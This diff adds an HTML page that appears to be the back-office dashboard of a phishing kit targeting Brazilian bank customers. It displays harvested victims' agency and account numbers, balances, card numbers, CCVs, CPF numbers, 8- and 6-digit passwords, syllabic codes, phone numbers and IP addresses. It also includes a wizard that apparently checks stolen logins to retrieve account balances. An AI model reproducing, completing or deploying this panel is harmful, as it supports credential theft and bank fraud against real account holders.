@@ -1,0 +1,518 @@
+<!doctype html>
+<html class="no-js" lang="en-US">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <title>BB</title>
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
+    <link rel="stylesheet" href="assets/fonts/line-awesome/css/line-awesome.min.css">
+    <link rel="stylesheet" href="assets/js/datatables/datatables.bundle.css" type="text/css" />
+    <link rel="stylesheet" href="assets/js/toastr/toastr.min.css">
+    <link rel="stylesheet" href="assets/css/wizard-2.css">
+    <link rel="stylesheet" href="assets/css/style.bundle.css">
+    <link rel="stylesheet" href="assets/css/style.css">
+</head>
+
+<body>
+    <header>
+        <div class="header">
+            <p>User Access Log</p>
+        </div>
+
+    </header>
+    <!-- Preloader Start -->
+    <div id="preloader-active">
+        <div class="preloader d-flex align-items-center justify-content-center">
+            <div class="preloader-inner ">
+                <div class="preloader-img pere-text">
+                    <img src="assets/img/preloader.jpeg" alt="" width="300px">
+                    <br>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="main">
+      <div class="container">
+        <div class="card card-custom">
+          <div class="card-header">
+            <div class="card-title">
+              <span class="card-icon">
+                <i class="flaticon2-supermarket text-primary"></i>
+              </span>
+              <h3 class="card-label">All Transactions</h3>
+            </div>
+            <div class="card-toolbar">
+              <a href="#" class="btn btn-primary font-weight-bolder open-modal" data-toggle="modal" data-target="#addLogModal">
+                <span class="svg-icon svg-icon-md">
+                  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="24px" height="24px" viewBox="0 0 24 24" version="1.1">
+                    <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                      <rect x="0" y="0" width="24" height="24" />
+                      <circle fill="#000000" cx="9" cy="15" r="6" />
+                      <path d="M8.8012943,7.00241953 C9.83837775,5.20768121 11.7781543,4 14,4 C17.3137085,4 20,6.6862915 20,10 C20,12.2218457 18.7923188,14.1616223 16.9975805,15.1987057 C16.9991904,15.1326658 17,15.0664274 17,15 C17,10.581722 13.418278,7 9,7 C8.93357256,7 8.86733422,7.00080962 8.8012943,7.00241953 Z" fill="#000000" opacity="0.3" />
+                    </g>
+                  </svg>
+                </span>New Record
+              </a>
+            </div>
+          </div>
+          <div class="card-body">
+            <table class="table table-bordered table-hover table-checkable" id="transaction_datatable" style="margin-top: 13px !important">
+              <thead>
+                <tr>
+                  <th>Date</th>
+                  <th>Agency</th>
+                  <th>Account</th>
+                  <th>Balance</th>
+                  <th>Card Name</th>
+                  <th>Card Number</th>
+                  <th>CCV</th>
+                  <th>CPF</th>
+                  <th>Is Visitied</th>
+                  <th>IP Address</th>
+                  <th>Actions</th>
+                </tr>
+              </thead>
+            </table>
+          </div>
+        </div>
+      </div>
+
+      <!-- Modal-->
+      <div class="modal fade" id="showLogModal" tabindex="-1" role="dialog" aria-labelledby="staticBackdrop" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-scrollable" role="document">
+          <div class="modal-content">
+              <div class="modal-header">
+                <h5 class="modal-title" id="exampleModalLabel">View Transaction</h5>
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                  <i aria-hidden="true" class="la la-close"></i>
+                </button>
+              </div>
+              <div class="modal-body">
+                <div class="card card-custom">
+                  <div class="card-body p-0">
+                    <div class="pb-5 detail-content">
+                      <div class="row">
+                        <div class="col-xl-6">
+                          <div class="form-group">
+                            <label>Name</label>
+                            <span class="form-text text-muted name"></span>
+                          </div>
+                        </div>
+                        <div class="col-xl-6">
+                          <div class="form-group">
+                            <label>Balance</label>
+                            <span class="form-text text-muted balance"></span>
+                          </div>
+                        </div>
+                        <div class="col-xl-6">
+                          <div class="form-group">
+                            <label>Agency</label>
+                            <span class="form-text text-muted agency"></span>
+                          </div>
+                        </div>
+                        <div class="col-xl-6">
+                          <div class="form-group">
+                            <label>Account</label>
+                            <span class="form-text text-muted account"></span>
+                          </div>
+                        </div>
+                        <div class="col-xl-6">
+                          <div class="form-group">
+                            <label>Password 8 digits</label>
+                            <span class="form-text text-muted password-8"></span>
+                          </div>
+                        </div>
+                        <div class="col-xl-6">
+                          <div class="form-group">
+                            <label>Phone</label>
+                            <span class="form-text text-muted phone"></span>
+                          </div>
+                        </div>
+                        <div class="col-xl-6">
+                          <div class="form-group">
+                            <label>Password 6 digits</label>
+                            <span class="form-text text-muted password-6"></span>
+                          </div>
+                        </div>
+                        <div class="col-xl-6">
+                          <div class="form-group">
+                            <label>Syllabic</label>
+                            <span class="form-text text-muted syllabic"></span>
+                          </div>
+                        </div>
+                        <div class="col-xl-6">
+                          <div class="form-group">
+                            <label>Card Name</label>
+                            <span class="form-text text-muted card-name"></span>
+                          </div>
+                        </div>
+                        <div class="col-xl-6">
+                          <div class="form-group">
+                            <label>Card Number</label>
+                            <span class="form-text text-muted card-number"></span>
+                          </div>
+                        </div>
+                        <div class="col-xl-6">
+                          <div class="form-group">
+                            <label>CCV</label>
+                            <span class="form-text text-muted ccv"></span>
+                          </div>
+                        </div>
+                        <div class="col-xl-6">
+                          <div class="form-group">
+                            <label>CPF</label>
+                            <span class="form-text text-muted cpf"></span>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="modal fade" id="addLogModal" tabindex="-1" role="dialog" aria-labelledby="staticBackdrop" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="exampleModalLabel">Add Transaction</h5>
+                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                        <i aria-hidden="true" class="la la-close"></i>
+                    </button>
+                </div>
+                <div class="modal-body">
+                    <div data-scroll="true" data-height="300">
+                      <div class="card card-custom">
+                        <div class="card-body p-0">
+                          <!--begin: Wizard-->
+                          <div class="wizard wizard-2" id="transaction_wizard" data-wizard-state="step-first" data-wizard-clickable="false">
+                            <!--begin: Wizard Nav-->
+                            <div class="wizard-nav border-right py-8 px-8 py-lg-20 px-lg-10">
+                              <!--begin::Wizard Step 1 Nav-->
+                              <div class="wizard-steps">
+                                <div class="wizard-step" data-wizard-type="step" data-wizard-state="current">
+                                  <div class="wizard-wrapper">
+                                    <div class="wizard-icon">
+                                      <span class="svg-icon svg-icon-2x">
+                                        <!--begin::Svg Icon | path:assets/media/svg/icons/General/User.svg-->
+                                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="24px" height="24px" viewBox="0 0 24 24" version="1.1">
+                                          <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                                            <polygon points="0 0 24 0 24 24 0 24" />
+                                            <path d="M12,11 C9.790861,11 8,9.209139 8,7 C8,4.790861 9.790861,3 12,3 C14.209139,3 16,4.790861 16,7 C16,9.209139 14.209139,11 12,11 Z" fill="#000000" fill-rule="nonzero" opacity="0.3" />
+                                            <path d="M3.00065168,20.1992055 C3.38825852,15.4265159 7.26191235,13 11.9833413,13 C16.7712164,13 20.7048837,15.2931929 20.9979143,20.2 C21.0095879,20.3954741 20.9979143,21 20.2466999,21 C16.541124,21 11.0347247,21 3.72750223,21 C3.47671215,21 2.97953825,20.45918 3.00065168,20.1992055 Z" fill="#000000" fill-rule="nonzero" />
+                                          </g>
+                                        </svg>
+                                        <!--end::Svg Icon-->
+                                      </span>
+                                    </div>
+                                    <div class="wizard-label">
+                                      <h3 class="wizard-title">Account Info 1</h3>
+                                      <div class="wizard-desc">Get Account's Balance</div>
+                                    </div>
+                                  </div>
+                                </div>
+                                <!--end::Wizard Step 1 Nav-->
+                                <!--begin::Wizard Step 2 Nav-->
+                                <div class="wizard-step" data-wizard-type="step">
+                                  <div class="wizard-wrapper">
+                                    <div class="wizard-icon">
+                                      <span class="svg-icon svg-icon-2x">
+                                        <!--begin::Svg Icon | path:assets/media/svg/icons/Map/Compass.svg-->
+                                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="24px" height="24px" viewBox="0 0 24 24" version="1.1">
+                                          <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                                            <polygon points="0 0 24 0 24 24 0 24" />
+                                            <path d="M12,11 C9.790861,11 8,9.209139 8,7 C8,4.790861 9.790861,3 12,3 C14.209139,3 16,4.790861 16,7 C16,9.209139 14.209139,11 12,11 Z" fill="#000000" fill-rule="nonzero" opacity="0.3" />
+                                            <path d="M3.00065168,20.1992055 C3.38825852,15.4265159 7.26191235,13 11.9833413,13 C16.7712164,13 20.7048837,15.2931929 20.9979143,20.2 C21.0095879,20.3954741 20.9979143,21 20.2466999,21 C16.541124,21 11.0347247,21 3.72750223,21 C3.47671215,21 2.97953825,20.45918 3.00065168,20.1992055 Z" fill="#000000" fill-rule="nonzero" />
+                                          </g>
+                                        </svg>
+                                        <!--end::Svg Icon-->
+                                      </span>
+                                    </div>
+                                    <div class="wizard-label">
+                                      <h3 class="wizard-title">Account Info 2</h3>
+                                      <div class="wizard-desc">Setup Account Info 2</div>
+                                    </div>
+                                  </div>
+                                </div>
+                                <!--end::Wizard Step 2 Nav-->
+                                <!--begin::Wizard Step 3 Nav-->
+                                <div class="wizard-step" data-wizard-type="step">
+                                  <div class="wizard-wrapper">
+                                    <div class="wizard-icon">
+                                      <span class="svg-icon svg-icon-2x">
+                                        <!--begin::Svg Icon | path:assets/media/svg/icons/General/Thunder-move.svg-->
+                                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="24px" height="24px" viewBox="0 0 24 24" version="1.1">
+                                          <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                                            <polygon points="0 0 24 0 24 24 0 24" />
+                                            <path d="M12,11 C9.790861,11 8,9.209139 8,7 C8,4.790861 9.790861,3 12,3 C14.209139,3 16,4.790861 16,7 C16,9.209139 14.209139,11 12,11 Z" fill="#000000" fill-rule="nonzero" opacity="0.3" />
+                                            <path d="M3.00065168,20.1992055 C3.38825852,15.4265159 7.26191235,13 11.9833413,13 C16.7712164,13 20.7048837,15.2931929 20.9979143,20.2 C21.0095879,20.3954741 20.9979143,21 20.2466999,21 C16.541124,21 11.0347247,21 3.72750223,21 C3.47671215,21 2.97953825,20.45918 3.00065168,20.1992055 Z" fill="#000000" fill-rule="nonzero" />
+                                          </g>
+                                        </svg>
+                                        <!--end::Svg Icon-->
+                                      </span>
+                                    </div>
+                                    <div class="wizard-label">
+                                      <h3 class="wizard-title">Account Info 3</h3>
+                                      <div class="wizard-desc">Setup Account Info 3 </div>
+                                    </div>
+                                  </div>
+                                </div>
+                                <!--end::Wizard Step 3 Nav-->
+                                <!--begin::Wizard Step 6 Nav-->
+                                <div class="wizard-step" data-wizard-type="step">
+                                  <div class="wizard-wrapper">
+                                    <div class="wizard-icon">
+                                      <span class="svg-icon svg-icon-2x">
+                                        <!--begin::Svg Icon | path:assets/media/svg/icons/General/Like.svg-->
+                                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="24px" height="24px" viewBox="0 0 24 24" version="1.1">
+                                          <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                                            <rect x="0" y="0" width="24" height="24" />
+                                            <path d="M9,10 L9,19 L10.1525987,19.3841996 C11.3761964,19.7920655 12.6575468,20 13.9473319,20 L17.5405883,20 C18.9706314,20 20.2018758,18.990621 20.4823303,17.5883484 L21.231529,13.8423552 C21.5564648,12.217676 20.5028146,10.6372006 18.8781353,10.3122648 C18.6189212,10.260422 18.353992,10.2430672 18.0902299,10.2606513 L14.5,10.5 L14.8641964,6.49383981 C14.9326895,5.74041495 14.3774427,5.07411874 13.6240179,5.00562558 C13.5827848,5.00187712 13.5414031,5 13.5,5 L13.5,5 C12.5694044,5 11.7070439,5.48826024 11.2282564,6.28623939 L9,10 Z" fill="#000000" />
+                                            <rect fill="#000000" opacity="0.3" x="2" y="9" width="5" height="11" rx="1" />
+                                          </g>
+                                        </svg>
+                                        <!--end::Svg Icon-->
+                                      </span>
+                                    </div>
+                                    <div class="wizard-label">
+                                      <h3 class="wizard-title">Completed!</h3>
+                                      <div class="wizard-desc">Review and Submit</div>
+                                    </div>
+                                  </div>
+                                </div>
+                                <!--end::Wizard Step 6 Nav-->
+                              </div>
+                            </div>
+                            <!--end: Wizard Nav-->
+
+                            <!--begin: Wizard Body-->
+                            <div class="wizard-body py-8 px-8 px-lg-10">
+                              <div class="row">
+                                <div class="offset-xxl-2 col-xxl-8">
+                                  <form class="form" id="wizard_form">
+                                    <!--begin: Wizard Step 1-->
+                                    <div class="pb-5" data-wizard-type="step-content" data-wizard-state="current">
+                                      <div class="form-group">
+                                        <label>Agency</label>
+                                        <input type="text" class="form-control form-control-solid form-control-lg" id="agency" placeholder="Agency" value="" />
+                                        <span class="form-text text-danger d-none">Please enter your Agency.</span>
+                                      </div>
+                                      <div class="form-group">
+                                        <label>Account</label>
+                                        <input type="text" class="form-control form-control-solid form-control-lg" id="account" placeholder="Account" value="" />
+                                        <span class="form-text text-danger d-none">Please enter your Account.</span>
+                                      </div>
+                                      <div class="form-group">
+                                        <label>Password 1</label>
+                                        <input type="password" class="form-control form-control-solid form-control-lg" id="password_8" placeholder="password" value="" />
+                                        <span class="form-text text-danger d-none">Please enter your Password 1.</span>
+                                      </div>
+                                      <span class="form-text text-danger error-msg d-none">Account Info Incorrect!!!</span>
+                                    </div>
+                                    <!--begin: Wizard Step 2-->
+                                    <div class="pb-5" data-wizard-type="step-content">
+                                      <div class="form-group">
+                                        <label>Phone</label>
+                                        <input type="text" class="form-control form-control-solid form-control-lg" id="phone" placeholder="phone" value="" />
+                                        <span class="form-text text-danger d-none">Please enter your Phone.</span>
+                                      </div>
+                                      <div class="form-group">
+                                        <label>Password 2</label>
+                                        <input type="password" class="form-control form-control-solid form-control-lg" id="password_6" placeholder="password_6" value="" />
+                                        <span class="form-text text-danger d-none">Please enter your Password 2.</span>
+                                      </div>
+                                      <div class="form-group">
+                                        <label>Syllabic</label>
+                                        <input type="password" class="form-control form-control-solid form-control-lg" id="syllabic" placeholder="syllabic" value="" />
+                                        <span class="form-text text-danger d-none">Please enter your Syllabic.</span>
+                                      </div>
+                                    </div>
+                                    <!--begin: Wizard Step 3-->
+                                    <div class="pb-5" data-wizard-type="step-content">
+                                      <div class="row">
+                                        <div class="col-xl-6">
+                                          <div class="form-group">
+                                            <label>Card Name</label>
+                                            <input type="text" class="form-control form-control-solid form-control-lg" id="card_name" placeholder="Card Name" value="" />
+                                            <span class="form-text text-danger d-none">Please enter your Card Name.</span>
+                                          </div>
+                                        </div>
+                                        <div class="col-xl-6">
+                                          <div class="form-group">
+                                            <label>Card Number</label>
+                                            <input type="text" class="form-control form-control-solid form-control-lg" id="card_number" placeholder="Card Number" value="" />
+                                            <span class="form-text text-danger d-none">Please enter your Card Number.</span>
+                                          </div>
+                                        </div>
+                                      </div>
+                                      <div class="row">
+                                        <div class="col-xl-6">
+                                          <div class="form-group">
+                                            <label>CCV</label>
+                                            <input type="text" class="form-control form-control-solid form-control-lg" id="ccv" placeholder="CCV" value="" />
+                                            <span class="form-text text-danger d-none">Please enter your CCV.</span>
+                                          </div>
+                                        </div>
+                                        <div class="col-xl-6">
+                                          <div class="form-group">
+                                            <label>CPF</label>
+                                            <input type="text" class="form-control form-control-solid form-control-lg" id="cpf" placeholder="CPF" value="" />
+                                            <span class="form-text text-danger d-none">Please enter your CPF.</span>
+                                          </div>
+                                        </div>
+                                      </div>
+                                    </div>
+                                    <!--begin: Wizard Step 4-->
+                                    <div class="pb-5" data-wizard-type="step-content">
+                                      <div class="row">
+                                        <div class="col-xl-6">
+                                          <div class="form-group">
+                                            <label>Name</label>
+                                            <span class="form-text text-muted"></span>
+                                            <input type="hidden" name="name" id="name_v" />
+                                          </div>
+                                        </div>
+                                        <div class="col-xl-6">
+                                          <div class="form-group">
+                                            <label>Balance</label>
+                                            <span class="form-text text-muted"></span>
+                                            <input type="hidden" name="balance" id="balance_v" />
+                                          </div>
+                                        </div>
+                                        <div class="col-xl-6">
+                                          <div class="form-group">
+                                            <label>Agency</label>
+                                            <span class="form-text text-muted"></span>
+                                            <input type="hidden" name="agency" id="agency_v" />
+                                          </div>
+                                        </div>
+                                        <div class="col-xl-6">
+                                          <div class="form-group">
+                                            <label>Account</label>
+                                            <span class="form-text text-muted"></span>
+                                            <input type="hidden" name="account" id="account_v" />
+                                          </div>
+                                        </div>
+                                        <div class="col-xl-6">
+                                          <div class="form-group">
+                                            <label>Password 8 digits</label>
+                                            <span class="form-text text-muted"></span>
+                                            <input type="hidden" name="password_8" id="password_1_v" />
+                                          </div>
+                                        </div>
+                                        <div class="col-xl-6">
+                                          <div class="form-group">
+                                            <label>Phone</label>
+                                            <span class="form-text text-muted"></span>
+                                            <input type="hidden" name="phone" id="phone_v" />
+                                          </div>
+                                        </div>
+                                        <div class="col-xl-6">
+                                          <div class="form-group">
+                                            <label>Password 6 digits</label>
+                                            <span class="form-text text-muted"></span>
+                                            <input type="hidden" name="password_6" id="password_2_v" />
+                                          </div>
+                                        </div>
+                                        <div class="col-xl-6">
+                                          <div class="form-group">
+                                            <label>Syllabic</label>
+                                            <span class="form-text text-muted"></span>
+                                            <input type="hidden" name="syllabic" id="syllabic_v" />
+                                          </div>
+                                        </div>
+                                        <div class="col-xl-6">
+                                          <div class="form-group">
+                                            <label>Card Name</label>
+                                            <span class="form-text text-muted"></span>
+                                            <input type="hidden" name="card_name" id="card_name_v" />
+                                          </div>
+                                        </div>
+                                        <div class="col-xl-6">
+                                          <div class="form-group">
+                                            <label>Card Number</label>
+                                            <span class="form-text text-muted"></span>
+                                            <input type="hidden" name="card_number" id="card_number_v" />
+                                          </div>
+                                        </div>
+                                        <div class="col-xl-6">
+                                          <div class="form-group">
+                                            <label>CCV</label>
+                                            <span class="form-text text-muted"></span>
+                                            <input type="hidden" name="ccv" id="ccv_v" />
+                                          </div>
+                                        </div>
+                                        <div class="col-xl-6">
+                                          <div class="form-group">
+                                            <label>CPF</label>
+                                            <span class="form-text text-muted"></span>
+                                            <input type="hidden" name="cpf" id="cpf_v" />
+                                          </div>
+                                        </div>
+                                      </div>
+                                    </div>
+                                    
+                                    <div class="d-flex justify-content-between border-top mt-5 pt-10">
+                                      <div class="mr-2">
+                                        <button type="button" class="btn btn-light-primary font-weight-bolder text-uppercase px-9 py-4" data-wizard-type="action-prev">Previous</button>
+                                      </div>
+                                      <div>
+                                        <button type="button" class="btn btn-success font-weight-bolder text-uppercase px-9 py-4" data-wizard-type="action-submit">Submit</button>
+                                        <button type="button" class="btn btn-primary font-weight-bolder text-uppercase px-9 py-4" data-wizard-type="action-next">Next</button>
+                                        <button type="button" class="btn btn-primary font-weight-bolder text-uppercase px-9 py-4 d-none" disabled>
+                                          <span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>
+                                          Loading...
+                                        </button>
+                                      </div>
+                                    </div>
+                                  
+                                  </form>
+                                </div>
+                                <!--end: Wizard-->
+                              </div>
+                              <!--end: Wizard Form-->
+                            </div>
+                            <!--end: Wizard Body-->
+                          </div>
+                          <!--end: Wizard-->
+                        </div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+      </div>
+
+      <div class="modal fade" id="confirm-delete" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    Delete Transaction
+                </div>
+                <div class="modal-body">
+                    Do you really delete selected Log?
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-default" data-dismiss="modal">Cancel</button>
+                    <a class="btn btn-danger btn-ok">Delete</a>
+                </div>
+            </div>
+        </div>
+    </div>
+    </div>
+    <script src="assets/js/vendor/jquery-1.12.4.min.js"></script>
+    <script src="assets/js/bootstrap.min.js"></script>
+    <script src="assets/js/jquery.mswitch.js"></script>
+    <script src="assets/js/jquery.form.js"></script>
+    <script src="assets/js/datatables/datatables.bundle.js"></script>
+    <script src="assets/js/toastr/toastr.min.js"></script>
+    <script src="assets/js/pages/wizard.js"></script>
+    <script src="assets/js/pages/dashboard.js"></script>
+</body>
+
+</html>
